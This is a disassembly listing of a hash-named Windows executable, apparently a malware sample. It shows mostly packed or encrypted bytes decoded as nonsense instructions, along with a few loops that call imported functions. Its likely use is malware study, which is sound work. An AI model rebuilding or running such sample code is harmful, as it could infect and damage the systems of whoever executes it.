
7201ae5f04b15a14adfac2071aad26f1e35443531a8c7c1c94afb6904fbd31e8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	(bad)  
  401015:	inc    esi
  401016:	in     eax,0xcd
  401018:	jle    0x401098
  40101a:	jle    0x40109a
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [esi]
  40102d:	lds    ecx,FWORD PTR [edi+ecx*1]
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0x3c
  4010c9:	xor    esi,DWORD PTR [ecx+0x4a2ef7a4]
  4010cf:	sti    
  4010d0:	(bad)  
  4010d1:	sbb    eax,0x16bdb35f
  4010d6:	dec    esi
  4010d7:	xchg   edi,eax
  4010d8:	mov    esi,0xd5b04ece
  4010dd:	(bad)  
  4010de:	rol    BYTE PTR [ebx],0xa5
  4010e1:	fstp   QWORD PTR [edi]
  4010e3:	js     0x40110f
  4010e5:	mov    BYTE PTR [edx],al
  4010e7:	aaa    
  4010e8:	sbb    al,0x47
  4010ea:	test   eax,ecx
  4010ec:	adc    eax,DWORD PTR [edi+0x5c]
  4010ef:	push   0x4d
  4010f1:	cdq    
  4010f2:	inc    DWORD PTR [edi+0x5b]
  4010f5:	ins    BYTE PTR es:[edi],dx
  4010f6:	dec    ebp
  4010f7:	jns    0x40110e
  4010f9:	mov    ah,0xfc
  4010fb:	jl     0x4010de
  4010fd:	mov    ebx,0xd50f71c5
  401102:	add    DWORD PTR [edx],edx
  401104:	and    DWORD PTR [edx],esp
  401106:	rol    BYTE PTR [ebx+0x4a96fd53],1
  40110c:	and    DWORD PTR [edx-0x5b],edi
  40110f:	sbb    DWORD PTR [esi-0x3a],eax
  401112:	mov    edx,0x6d35aacf
  401117:	scas   al,BYTE PTR es:[edi]
  401118:	cmp    al,0x7f
  40111a:	cmp    eax,0xabdb474e
  40111f:	dec    ebp
  401120:	repnz daa 
  401122:	(bad)
  401125:	pop    esp
  401126:	shl    dh,cl
  401128:	ins    DWORD PTR es:[edi],dx
  401129:	push   ebp
  40112a:	sbb    eax,0x1fcd0f7c
  40112f:	jge    0x4010f5
  401131:	push   ecx
  401132:	fstp   TBYTE PTR [edi]
  401134:	push   0xffffffc7
  401136:	test   BYTE PTR [edi],ch
  401138:	ja     0x40117a
  40113a:	adc    BYTE PTR ds:0x42e11245,dl
  401140:	pusha  
  401141:	sub    eax,0x6694ca29
  401146:	imul   eax,edi,0xffffff8c
  401149:	jne    0x40115b
  40114b:	xchg   edi,eax
  40114c:	jmp    0x401129
  40114e:	aad    0x86
  401150:	shl    BYTE PTR [ecx],0x62
  401153:	and    DWORD PTR [esi+0x68],ecx
  401156:	pop    ebp
  401157:	div    DWORD PTR [edi+esi*8]
  40115a:	xor    al,0xaf
  40115c:	jecxz  0x401183
  40115e:	cwde   
  40115f:	jp     0x4011b1
  401161:	popf   
  401162:	jp     0x4010ef
  401164:	call   0xd0ac:0x58f5358
  40116b:	and    eax,0xb065f053
  401170:	adc    eax,0x9b89232f
  401175:	jl     0x401133
  401177:	xor    DWORD PTR [ebp+0x4b],esp
  40117a:	and    DWORD PTR [ebp+0x3dce6d83],ecx
  401180:	mov    eax,0xdb3a915
  401185:	mov    ecx,0x6a6e7469
  40118a:	xchg   BYTE PTR [edx-0x1f42e621],ah
  401190:	into   
  401191:	inc    esp
  401192:	imul   ebp,DWORD PTR [esp+ebx*8],0xffffffaa
  401196:	rcr    DWORD PTR [ebp+0x2dc2e847],0x53
  40119d:	pop    edi
  40119e:	and    DWORD PTR [ebp+0x7b5981dc],0x6c60e62a
  4011a8:	xchg   edx,eax
  4011a9:	lods   al,BYTE PTR ds:[esi]
  4011aa:	in     eax,0x93
  4011ac:	jns    0x4011d2
  4011ae:	adc    eax,0x61a83330
  4011b3:	retf   
  4011b4:	push   ds
  4011b5:	rcl    BYTE PTR [ecx+0x41],cl
  4011b8:	add    bl,BYTE PTR [edi+0x31a6e4f2]
  4011be:	retf   
  4011bf:	imul   esi,ecx,0x8dd146f4
  4011c5:	adc    al,BYTE PTR [eax+0x585c5794]
  4011cb:	out    0xdc,al
  4011cd:	sub    al,0xf5
  4011cf:	clc    
  4011d0:	cmc    
  4011d1:	shl    BYTE PTR [esi+0x4ac81b83],0xfc
  4011d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011d9:	mov    cl,0xea
  4011db:	lock inc edi
  4011dd:	fwait
  4011de:	cli    
  4011df:	scas   al,BYTE PTR es:[edi]
  4011e0:	cmp    DWORD PTR [edi+0x46],edi
  4011e3:	in     al,dx
  4011e4:	ins    DWORD PTR es:[edi],dx
  4011e5:	daa    
  4011e6:	xchg   dh,al
  4011e8:	or     al,BYTE PTR [ebx]
  4011ea:	mov    ebp,0xce00814c
  4011ef:	mov    WORD PTR [edx+edi*1],cs
  4011f2:	xchg   edx,eax
  4011f3:	cmp    bl,BYTE PTR [ebp+edi*1-0x4f033e0b]
  4011fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011fb:	enter  0x1e2,0x16
  4011ff:	in     eax,dx
  401200:	test   al,0xd8
  401202:	shl    BYTE PTR [ecx-0x7bff0553],1
  401208:	(bad)
  40120b:	push   ebx
  40120c:	inc    ebp
  40120d:	mov    esi,0x1a9a8363
  401212:	mov    al,ds:0x75e00cfa
  401217:	push   0x88279054
  40121c:	dec    ebp
  40121d:	jns    0x401223
  40121f:	mov    eax,ds:0x8bd1a256
  401224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401225:	rcr    BYTE PTR [edx-0x26],0x4
  401229:	push   eax
  40122a:	push   ebx
  40122b:	leave  
  40122c:	and    DWORD PTR [ebp-0x1c4b0c1a],ebx
  401232:	ror    ch,0xaa
  401235:	fidiv  DWORD PTR [eax+0x37]
  401238:	inc    ebx
  401239:	sub    BYTE PTR [esi+0x51],0xba
  40123d:	and    eax,0x8df1acf4
  401242:	das    
  401243:	push   0x160ba5e7
  401248:	lds    esp,FWORD PTR [ecx-0x5c61ecbc]
  40124e:	and    eax,0x290e716d
  401253:	hlt    
  401254:	es nop
  401256:	mov    esi,0x2e18cd32
  40125b:	add    ch,dh
  40125d:	(bad)  
  40125e:	sub    DWORD PTR ds:0x9af10673,ebx
  401264:	cli    
  401265:	pop    eax
  401266:	sub    BYTE PTR [edx-0x6ebdd03a],dl
  40126c:	in     al,0xc5
  40126e:	xchg   DWORD PTR [edi+0x49],ecx
  401271:	pop    esi
  401272:	fwait
  401273:	sub    al,0x55
  401275:	das    
  401276:	mov    ds:0x805e0bf8,eax
  40127b:	jns    0x401232
  40127d:	paddd  mm1,QWORD PTR [ebp+0x78]
  401281:	mov    ecx,0xd17379d3
  401286:	lea    ebp,[ebx]
  401288:	mov    eax,ds:0x956614d2
  40128d:	mov    esi,0x6fde20af
  401292:	pop    esi
  401293:	jle    0x401241
  401295:	cmp    DWORD PTR [ebp+0x1c2653bc],eax
  40129b:	inc    edx
  40129c:	ret    0x3e09
  40129f:	test   ebx,esp
  4012a1:	dec    esi
  4012a2:	add    BYTE PTR [ebp+0x6d],dl
  4012a5:	sbb    al,0x7e
  4012a7:	xchg   edi,eax
  4012a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012a9:	dec    ebp
  4012aa:	or     dh,bl
  4012ac:	sbb    BYTE PTR [esi-0x237e2c98],ch
  4012b2:	cmp    edx,esi
  4012b4:	retf   
  4012b5:	sbb    BYTE PTR [ecx],al
  4012b7:	sub    DWORD PTR [ebx],esp
  4012b9:	and    dh,bh
  4012bb:	jecxz  0x401265
  4012bd:	xchg   esp,eax
  4012be:	mov    eax,ds:0xb251e60
  4012c3:	adc    edx,ecx
  4012c5:	dec    edi
  4012c6:	push   0xffffff93
  4012c8:	mov    cl,BYTE PTR [ebx+0x7e5819fa]
  4012ce:	dec    edi
  4012cf:	dec    edi
  4012d0:	mov    edi,0x52a877e9
  4012d5:	and    eax,0x8786217e
  4012da:	sub    DWORD PTR [esp+esi*2-0x393a4916],eax
  4012e1:	push   ebp
  4012e2:	shl    DWORD PTR [esi+ebx*8-0x43],1
  4012e6:	and    ebx,DWORD PTR [ebx-0x2d4582b]
  4012ec:	dec    eax
  4012ed:	or     BYTE PTR [ebp-0x7812a397],bl
  4012f3:	in     eax,dx
  4012f4:	push   ebp
  4012f5:	sbb    esi,DWORD PTR [edx+0x1135ab31]
  4012fb:	push   edx
  4012fc:	jmp    0x4012c7
  4012fe:	add    al,0xc5
  401300:	das    
  401301:	jecxz  0x401379
  401303:	inc    eax
  401304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401305:	push   ebx
  401306:	mov    al,0x5e
  401308:	xchg   esi,eax
  401309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40130a:	jo     0x4012f8
  40130c:	sub    ch,bh
  40130e:	ficom  DWORD PTR [ebp-0x19]
  401311:	les    esp,FWORD PTR [ebp-0x253d88f7]
  401317:	dec    edx
  401318:	or     BYTE PTR [ebx+0x1f],0xd2
  40131c:	test   DWORD PTR [eax],eax
  40131e:	mov    cl,al
  401320:	mov    esi,0x76dbc252
  401325:	retf   0xbdcb
  401328:	ss test al,0x52
  40132b:	mov    bl,0x1f
  40132d:	out    0x5f,al
  40132f:	idiv   DWORD PTR [ebp-0x47]
  401332:	or     BYTE PTR [ecx+0x5b1b51d7],ch
  401338:	xchg   ebp,eax
  401339:	cs ret 
  40133b:	daa    
  40133c:	in     eax,dx
  40133d:	cmp    eax,0x965f0c2f
  401342:	retf   
  401343:	aam    0x15
  401345:	cld    
  401346:	aaa    
  401347:	test   al,0x8a
  401349:	fcmovu st,st(2)
  40134b:	pop    es
  40134c:	dec    ecx
  40134d:	cmp    BYTE PTR ds:0xfe57bfa,0x72
  401354:	pop    esi
  401355:	pop    ecx
  401356:	add    eax,0xf1c93882
  40135b:	pop    edx
  40135c:	imul   ebp,DWORD PTR [ebp-0x1d97c41a],0xb
  401363:	js     0x40139b
  401365:	mov    ebp,ebp
  401367:	lods   al,BYTE PTR ds:[esi]
  401368:	stos   BYTE PTR es:[edi],al
  401369:	push   ecx
  40136a:	(bad)  [ebp-0x7164cff5]
  401370:	pop    ecx
  401371:	inc    ebx
  401372:	jb     0x401302
  401374:	jp     0x40130e
  401376:	in     al,0xe0
  401378:	faddp  st(5),st
  40137a:	and    BYTE PTR [ebp+0x72dda5b4],bl
  401380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401381:	sub    ah,BYTE PTR [ebp-0xeb6f6cc]
  401387:	push   edi
  401388:	inc    eax
  401389:	pop    esp
  40138a:	iret   
  40138b:	cmp    eax,0x19eebe33
  401390:	push   es
  401391:	(bad)  
  401392:	out    0x34,eax
  401394:	data16 outs dx,BYTE PTR ds:[esi]
  401396:	mov    dh,0x52
  401398:	stc    
  401399:	ficom  WORD PTR [edi-0x3b144868]
  40139f:	sbb    al,0x22
  4013a1:	add    ah,bl
  4013a3:	xchg   ebp,eax
  4013a4:	pop    esp
  4013a5:	(bad)  
  4013a6:	lock push edi
  4013a8:	shl    bl,cl
  4013aa:	loopne 0x4013d2
  4013ac:	dec    esi
  4013ad:	call   0x8aac6053
  4013b2:	dec    edx
  4013b3:	imul   eax,DWORD PTR [ebx+0x45c72cec],0x9c8532f8
  4013bd:	clc    
  4013be:	sbb    DWORD PTR ds:0x430606,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42efa0,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42efa0,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42efa0,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42eb6c
  401403:	mov    ecx,DWORD PTR ds:0x42efa0
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42efa0,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42efa4
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x4306d6,0x15
  401428:	cmp    DWORD PTR ds:0x4306d6,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x4306d6,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e965
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42eb70
  40145f:	cmp    DWORD PTR ds:0x4306d6,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x4306d6
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x4306d6,ecx
  401479:	mov    ecx,DWORD PTR ds:0x4306d6
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x4306d6,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43061a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x5650:0xc48b26e
  4014ab:	xchg   edi,eax
  4014ac:	aam    0x8e
  4014ae:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	sub    dl,BYTE PTR [edx-0x48216d65]
  4014bc:	push   0x4a
  4014be:	into   
  4014bf:	outs   dx,DWORD PTR ds:[esi]
  4014c0:	mov    dh,0x11
  4014c2:	cdq    
  4014c3:	in     eax,0x4b
  4014c5:	jl     0x4014c8
  4014c7:	sub    eax,DWORD PTR [esi-0xb]
  4014ca:	popf   
  4014cb:	mov    dl,0xd0
  4014cd:	pop    esi
  4014ce:	(bad)  
  4014cf:	imul   ebp,DWORD PTR [edi+0x58],0xa8ffc6be
  4014d6:	ret    0x749b
  4014d9:	cld    
  4014da:	lods   eax,DWORD PTR ds:[esi]
  4014db:	stc    
  4014dc:	daa    
  4014dd:	and    eax,0xec6321dd
  4014e2:	loopne 0x401514
  4014e4:	push   ecx
  4014e5:	int    0x32
  4014e7:	hlt    
  4014e8:	sbb    BYTE PTR [edx-0x58],0xb7
  4014ec:	sub    ah,BYTE PTR [edx]
  4014ee:	mov    cl,0xfc
  4014f0:	fcom   DWORD PTR [ebp-0x1949ab6f]
  4014f6:	mov    ecx,0xb024de7a
  4014fb:	cmp    dl,BYTE PTR [edi]
  4014fd:	sbb    BYTE PTR [esi+0x31],0xd7
  401501:	cmp    ch,BYTE PTR [eax-0x395282c2]
  401507:	mov    al,ds:0xb71acc2f
  40150c:	xchg   esi,eax
  40150d:	mov    esi,0x8c18cffc
  401512:	mov    DWORD PTR [edi+0x58],ecx
  401515:	test   eax,0xff4e9a37
  40151a:	and    BYTE PTR [edi-0x38fe6320],cl
  401520:	into   
  401521:	hlt    
  401522:	push   esp
  401523:	in     al,0x74
  401525:	or     al,0xa6
  401527:	addr16 je 0x40154d
  40152a:	enter  0x298c,0x67
  40152e:	sbb    BYTE PTR [eax],dh
  401530:	cmp    al,0x2c
  401532:	push   ecx
  401533:	enter  0xb330,0x31
  401537:	aaa    
  401538:	mov    ch,0x1b
  40153a:	arpl   WORD PTR [ebx+eax*8+0x2afa110b],cx
  401541:	add    BYTE PTR [eax],bl
  401543:	cmp    eax,0x29fe78fe
  401548:	inc    ecx
  401549:	add    eax,0x6d936e2
  40154e:	aam    0x66
  401550:	push   ebx
  401551:	imul   ebp,DWORD PTR [ecx+0x3d838986],0xffffff8f
  401558:	dec    eax
  401559:	push   cs
  40155a:	call   0x3d4d:0xbdb83ec
  401561:	pusha  
  401562:	imul   edi,DWORD PTR [ebp+0x3f],0x90f645af
  401569:	enter  0x213b,0xcc
  40156d:	popa   
  40156e:	popf   
  40156f:	int    0x6d
  401571:	pop    esi
  401572:	adc    eax,0x89b97a15
  401577:	dec    edx
  401578:	repnz cld 
  40157a:	mov    dh,0x6
  40157c:	and    BYTE PTR [edx-0x651b5cec],dh
  401582:	psubusb mm1,mm3
  401585:	pop    es
  401586:	cmp    ebp,DWORD PTR [edx-0x6b9bb830]
  40158c:	popf   
  40158d:	cwde   
  40158e:	imul   ecx,DWORD PTR ds:0xd5cded03,0x39
  401595:	xchg   esi,eax
  401596:	add    al,0x22
  401598:	call   0x78bd:0xda52e737
  40159f:	push   eax
  4015a0:	push   ds
  4015a1:	adc    ah,ah
  4015a3:	sbb    esi,DWORD PTR [ecx]
  4015a5:	add    al,0xa2
  4015a7:	adc    cl,cl
  4015a9:	(bad)
  4015ad:	aad    0x45
  4015af:	mov    DWORD PTR [ebx-0x2d],eax
  4015b2:	sub    ch,BYTE PTR [ebx+0x5a]
  4015b5:	and    BYTE PTR [edi-0x67b5521f],bl
  4015bb:	pop    DWORD PTR [eax-0x7c586f3c]
  4015c1:	test   ebp,esi
  4015c3:	jbe    0x401623
  4015c5:	mov    ebx,0x11e6b226
  4015ca:	scas   eax,DWORD PTR es:[edi]
  4015cb:	or     cl,BYTE PTR [edi]
  4015cd:	stos   DWORD PTR es:[edi],eax
  4015ce:	fcom   DWORD PTR [eax+ebp*8-0x38b04afc]
  4015d5:	mov    ebx,0xa08ad2c2
  4015da:	mov    eax,ds:0x89edb9d9
  4015df:	mov    dl,0x12
  4015e1:	xchg   BYTE PTR [edi+0x46d55836],ch
  4015e7:	xlat   BYTE PTR ds:[ebx]
  4015e8:	fadd   QWORD PTR [esi-0x5b]
  4015eb:	stos   DWORD PTR es:[edi],eax
  4015ec:	stos   BYTE PTR es:[edi],al
  4015ed:	or     al,0xe7
  4015ef:	mov    ah,0x56
  4015f1:	add    al,0x3e
  4015f3:	add    BYTE PTR [esi-0xf],ah
  4015f6:	call   0x5067747
  4015fb:	push   ds
  4015fc:	(bad)  
  4015fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015ff:	mov    esi,0xe82a470d
  401604:	in     eax,0xca
  401606:	jmp    0x401657
  401608:	sub    BYTE PTR [ebx],0x34
  40160b:	in     eax,dx
  40160c:	xor    BYTE PTR [edx],al
  40160e:	push   esi
  40160f:	mov    ecx,gs
  401611:	sbb    al,0x1c
  401613:	outs   dx,DWORD PTR ds:[esi]
  401614:	adc    ebx,esp
  401616:	pop    edx
  401617:	js     0x4015de
  401619:	pop    ecx
  40161a:	xlat   BYTE PTR ds:[ebx]
  40161b:	(bad)  
  40161c:	xor    al,0x9d
  40161e:	scas   al,BYTE PTR es:[edi]
  40161f:	pop    esp
  401620:	pop    ebx
  401621:	cmp    ch,BYTE PTR [ebx]
  401623:	pop    edx
  401624:	xchg   ebx,eax
  401625:	and    eax,0x2a47641e
  40162a:	repz xchg ebx,eax
  40162c:	test   eax,0x92bc9e71
  401631:	(bad)  
  401632:	mov    ch,0x27
  401634:	pop    ebp
  401635:	imul   edx,DWORD PTR [ebp+edi*8+0x17],0xfffffff1
  40163a:	sti    
  40163b:	cld    
  40163c:	jae    0x401646
  40163e:	dec    ebp
  40163f:	xor    al,0x2e
  401641:	push   0xffffffc3
  401643:	(bad)  
  401645:	ins    DWORD PTR es:[edi],dx
  401646:	neg    DWORD PTR [ebp-0x6b]
  401649:	jne    0x4015f8
  40164b:	or     BYTE PTR [esi-0x1c],al
  40164e:	popa   
  40164f:	(bad)
  401653:	add    ah,BYTE PTR [ecx]
  401655:	loope  0x401663
  401657:	pop    esp
  401658:	and    BYTE PTR [edi+0x303329f9],dl
  40165e:	repnz mov esi,0x55e669fb
  401664:	scas   eax,DWORD PTR es:[edi]
  401665:	repz cs dec esi
  401668:	dec    ecx
  401669:	out    dx,al
  40166a:	test   al,0x13
  40166c:	test   al,0x28
  40166e:	sub    al,0xb4
  401670:	mov    eax,ds:0x972af045
  401675:	(bad)  
  401676:	xor    al,0xda
  401678:	pop    ebp
  401679:	jg     0x401677
  40167b:	or     ecx,ecx
  40167d:	fisttp WORD PTR [edi+0x535aa82c]
  401683:	call   0x65477434
  401688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401689:	jge    0x4016f3
  40168b:	dec    ebx
  40168c:	push   ss
  40168d:	xor    ch,BYTE PTR [ecx]
  40168f:	pop    edx
  401690:	jmp    0x4016a8
  401692:	imul   ebp,DWORD PTR [ebx-0x1c],0x6171bcde
  401699:	popf   
  40169a:	shr    DWORD PTR [ebx],1
  40169c:	and    eax,0x2910fc7
  4016a1:	mul    BYTE PTR [edx+0x50]
  4016a4:	mov    ecx,0xb8899325
  4016a9:	adc    DWORD PTR [edx+edi*2-0x2],ebp
  4016ad:	pop    ss
  4016ae:	mov    ds:0xf7a81670,eax
  4016b3:	fcomp  DWORD PTR [ebp+ebp*1-0x58]
  4016b7:	ss push 0x5c7acdbe
  4016bd:	add    DWORD PTR [edx+0x4cbb4fb],0x5c
  4016c4:	xchg   edi,eax
  4016c5:	pop    edx
  4016c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016c7:	test   DWORD PTR [edx+ecx*1],esi
  4016ca:	std    
  4016cb:	fsub   QWORD PTR [edx-0x1c22641a]
  4016d1:	xchg   edi,eax
  4016d2:	mov    bh,ah
  4016d4:	ja     0x4016cc
  4016d6:	sub    cl,0x24
  4016d9:	mov    edi,0xc12b6b22
  4016de:	out    dx,eax
  4016df:	jbe    0x4016f0
  4016e1:	mov    al,0xa9
  4016e3:	mov    dh,0x2
  4016e5:	xor    bh,BYTE PTR [eax+esi*2+0xc3df011]
  4016ec:	std    
  4016ed:	(bad)  
  4016f1:	sbb    BYTE PTR [edx-0x6c5adca8],0xc9
  4016f8:	push   ebp
  4016f9:	icebp  
  4016fa:	pop    ebx
  4016fb:	sbb    BYTE PTR [edx-0x7a],al
  4016fe:	xchg   BYTE PTR [esp+ebp*4+0x9dcfb0a],al
  401705:	mov    esi,0x73f3c087
  40170a:	jb     0x4016c8
  40170c:	inc    ebp
  40170d:	add    dh,BYTE PTR [esi-0x5136335]
  401713:	xchg   BYTE PTR [eax+eiz*2+0x13],ch
  401717:	shr    DWORD PTR [esi+0x38],cl
  40171a:	mov    bh,0x73
  40171c:	push   ebx
  40171d:	enter  0xc9b2,0x3a
  401721:	add    eax,0xcfa77e4a
  401726:	or     DWORD PTR [edi+0x5aebf879],0xb647612c
  401730:	inc    BYTE PTR [ecx]
  401732:	leave  
  401733:	and    ch,BYTE PTR [ecx-0x54d4c724]
  401739:	pop    eax
  40173a:	ficom  WORD PTR [ecx]
  40173c:	mov    WORD PTR [edi-0x62a05215],gs
  401742:	js     0x4016d3
  401744:	fs lahf 
  401746:	fwait
  401747:	jmp    0x401755
  401749:	cmp    DWORD PTR [ebp-0x75965966],edx
  40174f:	push   edx
  401750:	pop    edi
  401751:	add    DWORD PTR [eax],esp
  401753:	dec    ebp
  401754:	scas   al,BYTE PTR es:[edi]
  401755:	and    eax,0x6096c924
  40175a:	xchg   edx,eax
  40175b:	inc    edi
  40175c:	hlt    
  40175d:	pushf  
  40175e:	aam    0x7c
  401760:	cmc    
  401761:	shl    edi,0xea
  401764:	mul    DWORD PTR [ebp-0x42]
  401767:	xchg   edx,eax
  401768:	push   0x5e7cd5c6
  40176d:	mov    ebx,0x38c24a3e
  401772:	xchg   esp,eax
  401773:	add    esi,DWORD PTR [esi]
  401775:	push   ss
  401776:	push   0xc4920d6c
  40177b:	xor    edi,edx
  40177d:	inc    esi
  40177e:	inc    ebp
  40177f:	shr    DWORD PTR [eax],cl
  401781:	sub    DWORD PTR [ecx-0x72],0xc6a5cbce
  401788:	out    dx,eax
  401789:	ja     0x401762
  40178b:	cmp    DWORD PTR [esp+ebp*4+0x60ed61f5],esi
  401792:	pop    ebp
  401793:	div    DWORD PTR [ebp+ebp*4+0x27]
  401797:	and    ah,dh
  401799:	xchg   dl,cl
  40179b:	mov    edi,0xc89dae26
  4017a0:	sub    ah,BYTE PTR [ecx-0x24]
  4017a3:	xor    DWORD PTR [eax],0x6c
  4017a6:	pop    eax
  4017a7:	sahf   
  4017a8:	daa    
  4017a9:	inc    esp
  4017aa:	popf   
  4017ab:	popf   
  4017ac:	jg     0x40177c
  4017ae:	cdq    
  4017af:	icebp  
  4017b0:	rcl    edi,0x16
  4017b3:	or     dl,bl
  4017b5:	mov    ebx,0x237f2185
  4017ba:	fwait
  4017bb:	jmp    FWORD PTR [edx]
  4017bd:	cmp    esp,esp
  4017bf:	stc    
  4017c0:	or     al,0xba
  4017c2:	test   eax,0xdd46d47a
  4017c7:	mov    bh,0xad
  4017c9:	add    bh,0xa3
  4017cc:	mov    al,ds:0xa4312a1a
  4017d1:	push   esi
  4017d2:	and    DWORD PTR [ecx-0x47c5eb8c],edx
  4017d8:	or     eax,edx
  4017da:	pop    esi
  4017db:	frstor [edx+0x29fca6be]
  4017e1:	mov    al,ds:0x44ceceba
  4017e6:	mov    al,ds:0xc4ce6c22
  4017eb:	mov    esp,0x8a325969
  4017f0:	jae    0x4017d0
  4017f2:	or     al,0xa5
  4017f4:	mov    eax,0xf68ce0dd
  4017f9:	xor    BYTE PTR [edx+ebx*2+0x61],bl
  4017fd:	repnz cdq 
  4017ff:	(bad)  
  401800:	sti    
  401801:	sar    BYTE PTR [esi+0x455fce86],cl
  401807:	cmc    
  401808:	mov    esp,0x2ef33a2d
  40180d:	inc    ecx
  40180e:	jmp    0x401842
  401810:	mov    bl,0x1f
  401812:	cmp    BYTE PTR [ebp-0x24],dh
  401815:	popf   
  401816:	ret    0x5d6c
  401819:	xchg   DWORD PTR [ebx+esi*8-0x3c],ebx
  40181d:	xor    ecx,DWORD PTR [ecx]
  40181f:	add    DWORD PTR [edi+0x31a7e9e3],eax
  401825:	sti    
  401826:	push   eax
  401827:	adc    al,0x7
  401829:	hlt    
  40182a:	mov    eax,ds:0x77569820
  40182f:	arpl   WORD PTR [edx+0x34],dx
  401832:	in     eax,0xf
  401834:	aad    0x10
  401836:	and    dl,dl
  401838:	xchg   DWORD PTR [edi],esp
  40183a:	push   ebx
  40183b:	mov    al,ds:0xeb60a659
  401840:	adc    ch,BYTE PTR [edi-0x2ae0a005]
  401846:	cmp    eax,DWORD PTR [esi+esi*1-0x6e]
  40184a:	mov    DWORD PTR [ebp-0x20],eax
  40184d:	neg    DWORD PTR ds:0x430616
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e8e2,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x4306c6,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x4306c2,0x13
  401884:	cmp    DWORD PTR ds:0x4306c2,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x4306c2,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42ec24
